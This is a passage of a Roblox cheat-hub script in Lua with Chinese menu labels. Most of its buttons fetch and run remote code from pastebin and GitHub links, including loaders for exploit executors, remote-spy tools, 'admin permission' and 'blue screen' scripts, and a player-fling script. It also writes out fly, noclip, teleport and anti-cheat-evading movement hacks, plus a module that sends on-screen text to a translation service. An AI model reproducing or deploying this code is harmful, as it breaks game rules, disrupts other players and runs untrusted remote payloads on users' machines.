    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/RhBR8wcM"))()
    end
})
kTab:Button({
    Title = "R6炽天使之刃",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BOOSBS/refs/heads/main/%E4%BA%91UI.txt"))()
    end
})
kTab:Button({
    Title = "跟随脚本",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/JfGTsxhK"))()
    end
})
kTab:Button({
    Title = "音乐播放器",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/beta/main/music.lua"))()
    end
})
kTab:Button({
    Title = "飞车",
    Icon = "mouse-pointer-click",
    Callback = function()
                local Speed = 100
        local HumanoidRP = game.Players.LocalPlayer.Character.HumanoidRootPart
        local ScreenGui = Instance.new("ScreenGui")
        local W = Instance.new("TextButton")
        local S = Instance.new("TextButton")
        local A = Instance.new("TextButton")
        local D = Instance.new("TextButton")
        local Fly = Instance.new("TextButton")
        local unfly = Instance.new("TextButton")
        local StopFly = Instance.new("TextButton")

        ScreenGui.Parent = game.CoreGui  
        ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  

        unfly.Name = "上"  
        unfly.Parent = ScreenGui  
        unfly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
        unfly.Position = UDim2.new(0.694387913, 0, 0.181818187, 0)  
        unfly.Size = UDim2.new(0, 72, 0, 50)  
        unfly.Font = Enum.Font.SourceSans  
        unfly.Text = "停止飞行"  
        unfly.TextColor3 = Color3.fromRGB(127, 34, 548)  
        unfly.TextScaled = true  
        unfly.TextSize = 14.000  
        unfly.TextWrapped = true  
        unfly.MouseButton1Down:Connect(function()  
            HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()  
            HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()  
        end)  

        StopFly.Name = "关闭飞行"  
        StopFly.Parent = ScreenGui  
        StopFly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
        StopFly.Position = UDim2.new(0.695689976, 0, 0.0213903747, 0)  
        StopFly.Size = UDim2.new(0, 71, 0, 50)  
        StopFly.Font = Enum.Font.SourceSans  
        StopFly.Text = "关闭飞行"  
        StopFly.TextColor3 = Color3.fromRGB(170, 0, 255)  
        StopFly.TextScaled = true  
        StopFly.TextSize = 14.000  
        StopFly.TextWrapped = true  
        StopFly.MouseButton1Down:Connect(function()  
            HumanoidRP.Anchored = true  
        end)  

        Fly.Name = "开启飞车"  
        Fly.Parent = ScreenGui  
        Fly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
        Fly.Position = UDim2.new(0.588797748, 0, 0.0213903747, 0)  
        Fly.Size = UDim2.new(0, 66, 0, 50)  
        Fly.Font = Enum.Font.SourceSans  
        Fly.Text = "飞行"  
        Fly.TextColor3 = Color3.fromRGB(170, 0, 127)  
        Fly.TextScaled = true  
        Fly.TextSize = 14.000  
        Fly.TextWrapped = true  
        Fly.MouseButton1Down:Connect(function()  
            local BV = Instance.new("BodyVelocity",HumanoidRP)  
            local BG = Instance.new("BodyGyro",HumanoidRP)  
            BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)  
            BG.D = 5000  
            BG.P = 50000  
            BG.CFrame = game.Workspace.CurrentCamera.CFrame  
            BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)  
        end)  

        W.Name = "W"  
        W.Parent = ScreenGui  
        W.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
        W.Position = UDim2.new(0.161668837, 0, 0.601604283, 0)  
        W.Size = UDim2.new(0, 58, 0, 50)  
        W.Font = Enum.Font.SourceSans  
        W.Text = "↑"  
        W.TextColor3 = Color3.fromRGB(226, 226, 526)  
        W.TextScaled = true  
        W.TextSize = 5.000  
        W.TextWrapped = true  
        W.MouseButton1Down:Connect(function()  
            HumanoidRP.Anchored = false  
            HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()  
            HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()  
            wait(.1)  
            local BV = Instance.new("BodyVelocity",HumanoidRP)  
            local BG = Instance.new("BodyGyro",HumanoidRP)  
            BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)  
            BG.D = 50000  
            BG.P = 50000  
            BG.CFrame = game.Workspace.CurrentCamera.CFrame  
            BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)  
            BV.Velocity = game.Workspace.CurrentCamera.CFrame.LookVector * Speed  
        end)  

        S.Name = "S"  
        S.Parent = ScreenGui  
        S.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
        S.Position = UDim2.new(0.161668837, 0, 0.735294104, 0)  
        S.Size = UDim2.new(0, 58, 0, 50)  
        S.Font = Enum.Font.SourceSans  
        S.Text = "↓"  
        S.TextColor3 = Color3.fromRGB(255, 255, 255)  
        S.TextScaled = true  
        S.TextSize = 14.000  
        S.TextWrapped = true  
        S.MouseButton1Down:Connect(function()  
            HumanoidRP.Anchored = false  
            HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()  
            HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()  
            wait(.1)  
            local BV = Instance.new("BodyVelocity",HumanoidRP)  
            local BG = Instance.new("BodyGyro",HumanoidRP)  
            BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)  
            BG.D = 5000  
            BG.P = 50000  
            BG.CFrame = game.Workspace.CurrentCamera.CFrame  
            BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)  
            BV.Velocity = game.Workspace.CurrentCamera.CFrame.LookVector * -Speed  
        end)  

        A.Name = "A"  
        A.Parent = ScreenGui  
        A.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
        A.Position = UDim2.new(0.0616688371, 0, 0.668449163, 0)  
        A.Size = UDim2.new(0, 58, 0, 50)  
        A.Font = Enum.Font.SourceSans  
        A.Text = "←"  
        A.TextColor3 = Color3.fromRGB(255, 255, 255)  
        A.TextScaled = true  
        A.TextSize = 14.000  
        A.TextWrapped = true  
        A.MouseButton1Down:Connect(function()  
            HumanoidRP.Anchored = false  
            HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()  
            HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()  
            wait(.1)  
            local BV = Instance.new("BodyVelocity",HumanoidRP)  
            local BG = Instance.new("BodyGyro",HumanoidRP)  
            BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)  
            BG.D = 5000  
            BG.P = 50000  
            BG.CFrame = game.Workspace.CurrentCamera.CFrame  
            BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)  
            BV.Velocity = game.Workspace.CurrentCamera.CFrame.RightVector * -Speed  
        end)  

        D.Name = "D"  
        D.Parent = ScreenGui  
        D.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
        D.Position = UDim2.new(0.261668837, 0, 0.668449163, 0)  
        D.Size = UDim2.new(0, 58, 0, 50)  
        D.Font = Enum.Font.SourceSans  
        D.Text = "→"  
        D.TextColor3 = Color3.fromRGB(255, 255, 255)  
        D.TextScaled = true  
        D.TextSize = 14.000  
        D.TextWrapped = true  
        D.MouseButton1Down:Connect(function()  
            HumanoidRP.Anchored = false  
            HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()  
            HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()  
            wait(.1)  
            local BV = Instance.new("BodyVelocity",HumanoidRP)  
            local BG = Instance.new("BodyGyro",HumanoidRP)  
            BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)  
            BG.D = 5000  
            BG.P = 50000  
            BG.CFrame = game.Workspace.CurrentCamera.CFrame  
            BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)  
            BV.Velocity = game.Workspace.CurrentCamera.CFrame.RightVector * Speed  
        end)  
    end
})
kTab:Button({
    Title = "电脑键盘",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
    end
})
kTab:Button({
    Title = "fe仿物理枪",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hdjsjjdgrhj/shark/refs/heads/main/fe%E4%BB%BF%E7%89%A9%E7%90%86%E6%9E%AA"))()        
    end
})
kTab:Button({
    Title = "fe分头行动",
    Icon = "mouse-pointer-click",
    Callback = function()
        --made by Nightmare#0930
local lp = game.Players.LocalPlayer
local char = lp.Character

for i, v in pairs(char:GetChildren()) do
    if v:IsA("BallSocketConstraint") then
        v:Destroy()
    end
end

for i, v in pairs(char:GetChildren()) do
    if v:IsA("HingeConstraint") then
        v:Destroy()
    end
end

for i, v in pairs(char.Humanoid:GetAccessories()) do
local hat = v.Name

char[hat].Archivable = true
local fake = char[hat]:Clone()
fake.Parent = char
fake.Handle.Transparency = 1

local hold = false
local enabled = false

char[hat].Handle.AccessoryWeld:Destroy()

local tool = Instance.new("Tool", lp.Backpack)
tool.RequiresHandle = true
tool.CanBeDropped = false
tool.Name = hat

local handle = Instance.new("Part", tool)
handle.Name = "Handle"
handle.Size = Vector3.new(1, 1, 1)
handle.Massless = true
handle.Transparency = 1

local positions = {
    forward = tool.GripForward,
    pos = tool.GripPos,
    right = tool.GripRight,
    up = tool.GripUp
}

tool.Equipped:connect(function()
 hold = true
end)

tool.Unequipped:connect(function()
   hold = false
end)

tool.Activated:connect(function()
    if enabled == false then
        enabled = true
        tool.GripForward = Vector3.new(-0.976,0,-0.217)
    tool.GripPos = Vector3.new(.95,-0.76,1.4)
    tool.GripRight = Vector3.new(0.217,0, 0.976)
    tool.GripUp = Vector3.new(0,1,0)
    wait(.8)
    tool.GripForward = positions.forward
    tool.GripPos = positions.pos
    tool.GripRight = positions.right
    tool.GripUp = positions.up
    enabled = false
    end
end)

game:GetService("RunService").Heartbeat:connect(function()
    pcall(function()
       char[hat].Handle.Velocity = Vector3.new(30, 0, 0)
if hold == false then
    char[hat].Handle.CFrame = fake.Handle.CFrame
elseif hold == true then
    char[hat].Handle.CFrame = handle.CFrame
    end
end)
end)
end        
    end
})
kTab:Button({
    Title = "人物旋转",
    Icon = "mouse-pointer-click",
    Callback = function()
                BY = "退休"
script = "免费开源"
QUN = "809771141"
fling = loadstring(game:HttpGet("https://raw.githubusercontent.com/JsYb666/TUIXUI_qun-809771141/refs/heads/TUIXUI/fling"))()
    end
})
kTab:Button({
    Title = "无头加断腿",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Permanent-Headless-And-korblox-Script-4140"))()
    end
})
kTab:Button({
    Title = "蓝屏",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/ROBLOX-XIAOYE666.lua"))()
    end
})
kTab:Button({
    Title = "R15变R6",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hdjsjjdgrhj/shark/refs/heads/main/r15%E5%8F%98r6"))()
    end
})
kTab:Button({
    Title = "fe饰品脚本",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/hat-scripts/refs/heads/main/updatedhathub.lua"))()
    end
})
kTab:Button({
    Title = "fe传送工具",
    Icon = "mouse-pointer-click",
    Callback = function()
         mouse = game.Players.LocalPlayer:GetMouse()

        tool = Instance.new("Tool")

        tool.RequiresHandle = false

        tool.Name = "[FE] 传送工具"

        tool.Activated:connect(function()

            local pos = mouse.Hit+Vector3.new(0,2.5,0)

            pos = CFrame.new(pos.X,pos.Y,pos.Z)

            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos

        end)

        tool.Parent = game.Players.LocalPlayer.Backpack
    end
})
kTab:Button({
    Title = "获取管理员权限",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/sZpgTVas"))()
    end
})
local flyTab = Window:Tab({
    Title = "飞行",
    Icon = "rbxassetid://113620356993593",
    Locked = false
})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local speaker = Players.LocalPlayer
local IYMouse = speaker:GetMouse()

local FLYING = false
local QEfly = true
local iyflyspeed = 1
local vehicleflyspeed = 1
local CFloop = nil
local CFspeed = 50
local Floating = false
local floatName = "IY_Float"
local swimming = false
local oldgrav = Workspace.Gravity
local swimbeat = nil
local Noclipping = nil
local Clip = true

local function getRoot(char)
    local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
    return rootPart
end

local function NOFLY()
    FLYING = false
    if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
    if speaker.Character:FindFirstChildOfClass('Humanoid') then
        speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
    end
    pcall(function() Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
end

local function sFLY(vfly)
    NOFLY()
    wait()
    local char = speaker.Character
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    local T = getRoot(char)
    local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
    local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
    local SPEED = 0

    local function FLY()
        FLYING = true
        local BG = Instance.new('BodyGyro')
        local BV = Instance.new('BodyVelocity')
        BG.P = 9e4
        BG.Parent = T
        BV.Parent = T
        BG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
        BG.CFrame = T.CFrame
        BV.Velocity = Vector3.new(0, 0, 0)
        BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        task.spawn(function()
            repeat task.wait()
                local camera = Workspace.CurrentCamera
                if not vfly and humanoid then
                    humanoid.PlatformStand = true
                end

                if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
                    SPEED = 50
                elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
                    SPEED = 0
                end
                if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
                    BV.Velocity = ((camera.CFrame.LookVector * (CONTROL.F + CONTROL.B)) + ((camera.CFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - camera.CFrame.p)) * SPEED
                    lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
                elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
                    BV.Velocity = ((camera.CFrame.LookVector * (lCONTROL.F + lCONTROL.B)) + ((camera.CFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - camera.CFrame.p)) * SPEED
                else
                    BV.Velocity = Vector3.new(0, 0, 0)
                end
                BG.CFrame = camera.CFrame
            until not FLYING
            CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
            lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
            SPEED = 0
            BG:Destroy()
            BV:Destroy()
            if humanoid then humanoid.PlatformStand = false end
        end)
    end

    flyKeyDown = UserInputService.InputBegan:Connect(function(input, processed)
        if processed then return end
        if input.KeyCode == Enum.KeyCode.W then
            CONTROL.F = (vfly and vehicleflyspeed or iyflyspeed)
        elseif input.KeyCode == Enum.KeyCode.S then
            CONTROL.B = - (vfly and vehicleflyspeed or iyflyspeed)
        elseif input.KeyCode == Enum.KeyCode.A then
            CONTROL.L = - (vfly and vehicleflyspeed or iyflyspeed)
        elseif input.KeyCode == Enum.KeyCode.D then
            CONTROL.R = (vfly and vehicleflyspeed or iyflyspeed)
        elseif input.KeyCode == Enum.KeyCode.E and QEfly then
            CONTROL.Q = (vfly and vehicleflyspeed or iyflyspeed)*2
        elseif input.KeyCode == Enum.KeyCode.Q and QEfly then
            CONTROL.E = -(vfly and vehicleflyspeed or iyflyspeed)*2
        end
        pcall(function() Workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
    end)

    flyKeyUp = UserInputService.InputEnded:Connect(function(input, processed)
        if processed then return end
        if input.KeyCode == Enum.KeyCode.W then
            CONTROL.F = 0
        elseif input.KeyCode == Enum.KeyCode.S then
            CONTROL.B = 0
        elseif input.KeyCode == Enum.KeyCode.A then
            CONTROL.L = 0
        elseif input.KeyCode == Enum.KeyCode.D then
            CONTROL.R = 0
        elseif input.KeyCode == Enum.KeyCode.E then
            CONTROL.Q = 0
        elseif input.KeyCode == Enum.KeyCode.Q then
            CONTROL.E = 0
        end
    end)
    FLY()
end



flyTab:Toggle({
    Title = "Q/E 垂直升降",
    Flag = "IY_QEFly",
    Default = true,
    Callback = function(v)
        QEfly = v
    end
})

flyTab:Toggle({
    Title = "CFrame 飞行 (防反作弊)",
    Flag = "IY_CFrameFly",
    Callback = function(v)
        if v then
            speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
            local Head = speaker.Character:WaitForChild("Head")
            Head.Anchored = true
            if CFloop then CFloop:Disconnect() end
            CFloop = RunService.Heartbeat:Connect(function(deltaTime)
                local moveDirection = speaker.Character:FindFirstChildOfClass('Humanoid').MoveDirection * (CFspeed * deltaTime)
                local headCFrame = Head.CFrame
                local camera = Workspace.CurrentCamera
                local cameraCFrame = camera.CFrame
                local cameraOffset = headCFrame:ToObjectSpace(cameraCFrame).Position
                cameraCFrame = cameraCFrame * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
                local cameraPosition = cameraCFrame.Position
                local headPosition = headCFrame.Position
                local objectSpaceVelocity = CFrame.new(cameraPosition, Vector3.new(headPosition.X, cameraPosition.Y, headPosition.Z)):VectorToObjectSpace(moveDirection)
                Head.CFrame = CFrame.new(headPosition) * (cameraCFrame - cameraPosition) * CFrame.new(objectSpaceVelocity)
            end)
        else
            if CFloop then
                CFloop:Disconnect()
                speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
                local Head = speaker.Character:WaitForChild("Head")
                Head.Anchored = false
            end
        end
    end
})

flyTab:Slider({
    Title = "CFrame 飞行速度",
    Step = 1,
    Value = {
        Min = 10,
        Max = 500,
        Default = 50,
    },
    Callback = function(v)
        CFspeed = v
    end
})

flyTab:Toggle({
    Title = "穿墙",
    Flag = "IY_Noclip",
    Callback = function(v)
        Clip = not v
        if v then
            local function NoclipLoop()
                if Clip == false and speaker.Character ~= nil then
                    for _, child in pairs(speaker.Character:GetDescendants()) do
                        if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
                            child.CanCollide = false
                        end
                    end
                end
            end
            Noclipping = RunService.Stepped:Connect(NoclipLoop)
        else
            if Noclipping then Noclipping:Disconnect() end
        end
    end
})

flyTab:Toggle({
    Title = "悬浮平台",
    Flag = "IY_Float",
    Callback = function(v)
        Floating = v
        local pchar = speaker.Character
        if v and pchar and not pchar:FindFirstChild(floatName) then
            task.spawn(function()
                local Float = Instance.new('Part')
                Float.Name = floatName
                Float.Parent = pchar
                Float.Transparency = 1
                Float.Size = Vector3.new(2,0.2,1.5)
                Float.Anchored = true
                local FloatValue = -3.1
                Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0,FloatValue,0)
                local qUp = IYMouse.KeyUp:Connect(function(KEY) if KEY == 'q' then FloatValue = FloatValue + 0.5 end end)
                local eUp = IYMouse.KeyUp:Connect(function(KEY) if KEY == 'e' then FloatValue = FloatValue - 1.5 end end)
                local qDown = IYMouse.KeyDown:Connect(function(KEY) if KEY == 'q' then FloatValue = FloatValue - 0.5 end end)
                local eDown = IYMouse.KeyDown:Connect(function(KEY) if KEY == 'e' then FloatValue = FloatValue + 1.5 end end)
                local FloatingFunc
                local function FloatPadLoop()
                    if Floating and pchar:FindFirstChild(floatName) and getRoot(pchar) then
                        Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0,FloatValue,0)
                    else
                        FloatingFunc:Disconnect()
                        Float:Destroy()
                        qUp:Disconnect()
                        eUp:Disconnect()
                        qDown:Disconnect()
                        eDown:Disconnect()
                    end
                end         
                FloatingFunc = RunService.Heartbeat:Connect(FloatPadLoop)
            end)
        elseif not v then
            Floating = false
            if pchar:FindFirstChild(floatName) then
                pchar:FindFirstChild(floatName):Destroy()
            end
        end
    end
})

flyTab:Toggle({
    Title = "空中游泳",
    Flag = "IY_Swim",
    Callback = function(v)
        swimming = v
        if v and speaker and speaker.Character and speaker.Character:FindFirstChildWhichIsA("Humanoid") then
            oldgrav = Workspace.Gravity
            Workspace.Gravity = 0
            local Humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
            local enums = Enum.HumanoidStateType:GetEnumItems()
            table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
            for i, val in pairs(enums) do
                Humanoid:SetStateEnabled(val, false)
            end
            Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
            swimbeat = RunService.Heartbeat:Connect(function()
                pcall(function()
                    getRoot(speaker.Character).Humanoid.RootPart.Velocity = ((Humanoid.MoveDirection ~= Vector3.new() or UserInputService:IsKeyDown(Enum.KeyCode.Space)) and getRoot(speaker.Character).Humanoid.RootPart.Velocity or Vector3.new())
                end)
            end)
        else
            Workspace.Gravity = oldgrav
            if swimbeat ~= nil then
                swimbeat:Disconnect()
                swimbeat = nil
            end
            if speaker.Character then
                local Humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
                if Humanoid then
                    local enums = Enum.HumanoidStateType:GetEnumItems()
                    table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
                    for i, val in pairs(enums) do
                        Humanoid:SetStateEnabled(val, true)
                    end
                end
            end        end
    end
})
toolTab = Window:Tab({
    Title = "工具",
    Icon = "rbxassetid://113620356993593",
    Locked = false
})
toolTab:Button({
    Title = "Dex",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
    end
})
toolTab:Button({
    Title = "Simple spy",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"))()
    end
})
toolTab:Button({
    Title = "f3x工具",
    Icon = "mouse-pointer-click",
    Callback = function()
     	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/refs/heads/main/f3x.lua"))()
    end
})
toolTab:Button({
    Title = "Spy(中文)",
    Icon = "mouse-pointer-click",
    Callback = function()
     	loadstring(game:HttpGet("https://pastefy.app/YUec4Px9/raw"))()
    end
})
toolTab:Button({
    Title = "moonsec v3反混淆",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/y4C65ZQx/raw", true))()
    end
})
executeTab = Window:Tab({
    Title = "注入器",
    Icon = "rbxassetid://113620356993593",
    Locked = false
})
executeTab:Button({
    Title = "阿尔宙斯",
    Icon = "mouse-pointer-click",
    Callback = function()
     	loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
    end
})
executeTab:Button({
    Title = "Krnl",
    Icon = "mouse-pointer-click",
    Callback = function()
     	loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/krnlnoui.lua"))()
    end
})
executeTab:Button({
    Title = "Delta",
    Icon = "mouse-pointer-click",
    Callback = function()
     	loadstring(game:HttpGet("https://pastebin.com/raw/hGw25z4b"))() 
    end
})
executeTab:Button({
    Title = "Synapse X",
    Icon = "mouse-pointer-click",
    Callback = function()
     	loadstring(game:HttpGet("https://pastebin.com/raw/tWGxhNq0"))() 
    end
})
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")

local TranslationCache = {}
local RequestQueue = {}
local Processing = {}
local TranslatedObjects = setmetatable({}, {__mode = "k"})
local AutoTranslateEnabled = false

local SkipTexts = {
    ["Sky Hub"] = true,
    ["语音气泡对齐中心"] = true,
    ["语音"] = true,
    ["气泡对齐中心"] = true,
    ["Loading..."] = false, 
}

local SkipCoreGuiNames = {
    TopBar = true,
    RobloxGui = true,
    ExperienceChat = true,
    VoiceChat = true,
    PlayerList = true,
    TouchGui = true,
    ControlGui = true,
    PlayerControls = true
}

local function isBlockedSystemUI(obj)
    if not obj:IsDescendantOf(CoreGui) then return false end

    local p = obj
    while p do
        if SkipCoreGuiNames[p.Name] then
            return true
        end
        
        p = p.Parent
    end

    if obj:IsA("TextLabel") or obj:IsA("TextButton") then
        local y = obj.AbsolutePosition.Y
        if y <= 0 then 
            return true
        end
    end

    return false
end

local function isValidText(text)
    if not text or #text == 0 or text:match("^%s*$") then return false end
    if SkipTexts[text] then return false end
    if text:gsub("%d", ""):gsub("%p", ""):match("^%s*$") then return false end
    
    if text:match("[\228-\233]") then return false end 
    return true
end

local function translateText(text, callback)
    if not AutoTranslateEnabled then return end
    if not isValidText(text) then return end

    if TranslationCache[text] then
        callback(TranslationCache[text])
        return
    end

    if Processing[text] then
        RequestQueue[text] = RequestQueue[text] or {}
        table.insert(RequestQueue[text], callback)
        return
    end

    Processing[text] = true

    task.spawn(function()
        if not AutoTranslateEnabled then
            Processing[text] = nil
            return
        end

        local result = nil
        local success, response = pcall(function()
            
            local url = "https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=zh-CN&dt=t&q=" .. HttpService:UrlEncode(text)
            local res = game:HttpGet(url)
            local decoded = HttpService:JSONDecode(res)
            if decoded and decoded[1] then
                local fullText = ""
                for _, part in ipairs(decoded[1]) do
                    fullText = fullText .. (part[1] or "")
                end
                return fullText
            end
            error("No translation data")
        end)

        Processing[text] = nil

        if success and response then
            result = response
     
            TranslationCache[text] = result
            
            if AutoTranslateEnabled then
                callback(result)
            end

            if RequestQueue[text] then
                for _, cb in ipairs(RequestQueue[text]) do
                    if AutoTranslateEnabled then
                        task.spawn(cb, result)
                    end
                end
            end
        else
            
            if RequestQueue[text] then
                RequestQueue[text] = nil
            end
        end
    end)
end

local function isScriptUI(obj)
    if typeof(Window) == "table" and Window.UIElements and Window.UIElements.Main then
        return obj:IsDescendantOf(Window.UIElements.Main)
    end
    return false
end

local function applyTranslation(obj)
    if not AutoTranslateEnabled then return end
    if not obj then return end
    if TranslatedObjects[obj] then return end
    if isScriptUI(obj) then return end
    if isBlockedSystemUI(obj) then return end

    if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
        TranslatedObjects[obj] = true

        local lastText = ""
        
        local function updateText()
            if not AutoTranslateEnabled then return end
            if not obj or not obj.Parent then return end
            
            local currentText = obj.Text
            if currentText == lastText then return end 
            
         
            for _, v in pairs(TranslationCache) do
                if v == currentText then return end
            end

            if AutoTranslateEnabled and isValidText(currentText) then
                translateText(currentText, function(translated)
                    if AutoTranslateEnabled and obj and obj.Parent then
                        lastText = translated
                        obj.Text = translated
                    end
                end)
            end
        end

       
        updateText()
        
        
        obj:GetPropertyChangedSignal("Text"):Connect(updateText)

        if obj:IsA("TextBox") then
            local function updatePlaceholder()
                if not AutoTranslateEnabled then return end
                if not obj or not obj.Parent then return end
                local currentPlaceholder = obj.PlaceholderText
                if AutoTranslateEnabled and isValidText(currentPlaceholder) then
                    translateText(currentPlaceholder, function(translated)
                        if AutoTranslateEnabled and obj and obj.Parent then
                            obj.PlaceholderText = translated
                        end
                    end)
                end
            end
            updatePlaceholder()
            obj:GetPropertyChangedSignal("PlaceholderText"):Connect(updatePlaceholder)
        end
    end
end

local function scanAndTranslate(parent)
    for _, v in ipairs(parent:GetDescendants()) do
        applyTranslation(v)
    end
    parent.DescendantAdded:Connect(function(v)
        task.defer(applyTranslation, v)
    end)
end

local translateTab = nil
if typeof(Window) == "table" then
    translateTab = Window:Tab({
        Title = "自动翻译",
        Icon = "rbxassetid://113620356993593",
        Locked = false
    })

    translateTab:Toggle({
        Title = "启用自动翻译",
        Flag = "AutoTranslate",
        Callback = function(v)
            AutoTranslateEnabled = v
            if v then
                local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
                scanAndTranslate(playerGui)
                scanAndTranslate(CoreGui)
                
                -- 额外扫描工作区内的 SurfaceGui/BillboardGui
                scanAndTranslate(game:GetService("Workspace"))
            end
        end
    })

    translateTab:Button({
        Title = "强力翻译所有界面",
        Icon = "refresh-cw",
        Callback = function()
            if not AutoTranslateEnabled then return end
            TranslatedObjects = setmetatable({}, {__mode = "k"}) 
            for _, root in ipairs({Players.LocalPlayer:FindFirstChild("PlayerGui"), CoreGui, game:GetService("Workspace")}) do
                if root then
                    task.spawn(function()
                        for _, v in ipairs(root:GetDescendants()) do
                            applyTranslation(v)
                        end
                    end)
                end
            end
        end
    })
else
    task.spawn(function()
        AutoTranslateEnabled = true
        local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
        scanAndTranslate(playerGui)
        scanAndTranslate(CoreGui)
        scanAndTranslate(game:GetService("Workspace")) 
    end)
end
